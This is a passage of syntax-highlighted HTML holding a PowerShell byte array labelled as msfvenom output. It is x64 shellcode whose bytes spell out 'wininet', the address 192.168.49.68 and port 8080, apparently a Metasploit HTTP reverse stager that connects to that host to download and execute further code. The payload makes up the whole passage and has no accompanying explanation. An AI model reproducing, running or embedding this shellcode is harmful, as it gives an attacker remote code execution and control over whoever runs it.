style="color:#0088ff;font-weight:400">#msfvenom -f ps1</span><br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]] <span style="color:#0088ff;font-weight:400">$buf</span> <span style="color:#ff9d00;font-weight:700">=</span><br /><span style="color:#333333;font-weight:400">0xfc</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xe4</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0xcc</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xd2</span>,<span style="color:#333333;font-weight:400">0x65</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,0x<br /><span style="color:#333333;font-weight:400">60</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0xb7</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x72</span>,0x<br /><span style="color:#333333;font-weight:400">50</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x7c</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x2c</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0xed</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span><br />,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x42</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x81</span>,<span style="color:#333333;font-weight:400">0x78</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0xb</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<br /><span style="color:#333333;font-weight:400">0x80</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x67</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span><br />,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0xe3</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd6</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xc9</span><br />,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xf1</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x3</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x8</span>,<span style="color:#333333;font-weight:400">0x45</span>,<span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0xd1</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xd8</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,0x<br /><span style="color:#333333;font-weight:400">40</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x1c</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x4</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0</span><br />xd0,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x5e</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xec</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<br /><span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x12</span>,<span style="color:#333333;font-weight:400">0xe9</span>,<span style="color:#333333;font-weight:400">0x4b</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0x5d</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xdb</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xbe</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x69</span>,<span style="color:#333333;font-weight:400">0x6e</span><br />,<span style="color:#333333;font-weight:400">0x69</span>,<span style="color:#333333;font-weight:400">0x6e</span>,<span style="color:#333333;font-weight:400">0x65</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe1</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc2</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x26</span>,<span style="color:#333333;font-weight:400">0x7</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x48</span>,<br /><span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe1</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x3a</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x79</span>,<span style="color:#333333;font-weight:400">0xa7</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xf</span><br />f,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0xe</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x2e</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0x36</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0x2e</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0x2e</span>,<span style="color:#333333;font-weight:400">0x36</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,0x<br /><span style="color:#333333;font-weight:400">89</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x90</span>,<span style="color:#333333;font-weight:400">0x1f</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x3</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0x9f</span>,<span style="color:#333333;font-weight:400">0xc6</span><br />,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x2f</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x70</span>,<span style="color:#333333;font-weight:400">0x45</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0x42</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x4f</span>,<br /><span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x65</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x78</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x67</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x6f</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x6c</span>,<span style="color:#333333;font-weight:400">0x4b</span>,<span style="color:#333333;font-weight:400">0x4e</span><br />,<span style="color:#333333;font-weight:400">0x62</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x37</span>,<span style="color:#333333;font-weight:400">0x43</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x67</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0x45</span>,<span style="color:#333333;font-weight:400">0x6b</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0x36</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x37</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x6</span><br />d,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x76</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x63</span>,<span style="color:#333333;font-weight:400">0x76</span>,<span style="color:#333333;font-weight:400">0x4e</span>,<span style="color:#333333;font-weight:400">0x35</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x76</span>,<span style="color:#333333;font-weight:400">0x42</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x71</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x35</span>,<span style="color:#333333;font-weight:400">0x70</span>,<span style="color:#333333;font-weight:400">0x68</span>,0x<br /><span style="color:#333333;font-weight:400">33</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x4b</span>,<span style="color:#333333;font-weight:400">0x45</span>,<span style="color:#333333;font-weight:400">0x70</span>,<span style="color:#333333;font-weight:400">0x4f</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0x2d</span>,<span style="color:#333333;font-weight:400">0x6d</span>,<span style="color:#333333;font-weight:400">0x73</span>,<span style="color:#333333;font-weight:400">0x36</span>,<span style="color:#333333;font-weight:400">0x6d</span>,<span style="color:#333333;font-weight:400">0x39</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x6e</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x63</span>,<span style="color:#333333;font-weight:400">0x70</span>,<span style="color:#333333;font-weight:400">0x37</span>,<span style="color:#333333;font-weight:400">0x64</span>,<span style="color:#333333;font-weight:400">0</span><br />x71,<span style="color:#333333;font-weight:400">0x73</span>,<span style="color:#333333;font-weight:400">0x2d</span>,<span style="color:#333333;font-weight:400">0x47</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x47</span>,<span style="color:#333333;font-weight:400">0x4f</span>,<span style="color:#333333;font-weight:400">0x54</span>,<span style="color:#333333;font-weight:400">0x6c</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x6d</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x71</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<br /><span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x67</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x4e</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x69</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x6e</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x73</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0x70</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x53</span>,<br /><span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xb8</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x28</span>,<span style="color:#333333;font-weight:400">0x84</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc2</span>,<br /><span style="color:#333333;font-weight:400">0xeb</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x2e</span>,<span style="color:#333333;font-weight:400">0x3b</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xc6</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf1</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<br /><span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc2</span>,<span style="color:#333333;font-weight:400">0x2d</span>,<span style="color:#333333;font-weight:400">0x6</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0x7b</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0x1f</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x13</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0</span><br />x0,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0x35</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xcf</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0xeb</span>,<span style="color:#333333;font-weight:400">0xcc</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0x55</span>,<span style="color:#333333;font-weight:400">0x0</span>,0x<br /><span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xd1</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0xba</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0</span><br />xa4,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x93</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe7</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xf1</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xda</span>,<span style="color:#333333;font-weight:400">0x49</span><br />,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span 